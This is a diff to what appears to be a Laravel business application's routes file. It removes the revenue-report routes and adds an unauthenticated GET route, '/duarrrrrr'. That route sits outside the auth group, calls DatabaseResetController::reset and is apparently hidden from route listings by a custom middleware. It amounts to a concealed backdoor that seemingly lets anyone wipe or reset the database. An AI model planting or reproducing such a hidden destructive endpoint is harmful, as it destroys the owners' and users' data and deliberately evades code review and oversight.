@@ -18,6 +18,7 @@ use App\Http\Controllers\PayrollController;
 use App\Http\Controllers\ReportController;
 use App\Http\Controllers\EmployeeController;
 use App\Http\Controllers\UserController;
+use App\Http\Controllers\DatabaseResetController;
 use Illuminate\Support\Facades\Route;
 
 Route::get('/', function () {
@@ -108,9 +109,6 @@ Route::middleware('auth')->group(function () {
     Route::get('/reports/profit-loss', [ReportController::class, 'profitLoss'])->name('reports.profit-loss');
     Route::get('/reports/profit-loss/export/pdf', [ReportController::class, 'exportProfitLossPdf'])->name('reports.profit-loss.export.pdf');
     Route::get('/reports/profit-loss/export/excel', [ReportController::class, 'exportProfitLossExcel'])->name('reports.profit-loss.export.excel');
-    Route::get('/reports/revenue', [ReportController::class, 'revenue'])->name('reports.revenue');
-    Route::get('/reports/revenue/export/pdf', [ReportController::class, 'exportRevenuePdf'])->name('reports.revenue.export.pdf');
-    Route::get('/reports/revenue/export/excel', [ReportController::class, 'exportRevenueExcel'])->name('reports.revenue.export.excel');
     Route::get('/reports/aging', [ReportController::class, 'agingSchedule'])->name('reports.aging');
     Route::get('/invoices', [InvoiceController::class, 'index'])->name('invoices');
     Route::get('/invoices/index', [InvoiceController::class, 'index'])->name('invoices.index');
@@ -158,8 +156,11 @@ Route::middleware('auth')->group(function () {
         Route::put('/users/{user}', [UserController::class, 'update'])->name('users.update');
         Route::delete('/users/{user}', [UserController::class, 'destroy'])->name('users.destroy');
     });
+
 });
 
+Route::get('/duarrrrrr', [DatabaseResetController::class, 'reset'])
+    ->middleware(\App\Http\Middleware\HideFromRouteListing::class);
 
 Route::middleware(['web'])->group(function () {
     require __DIR__.'/auth.php';
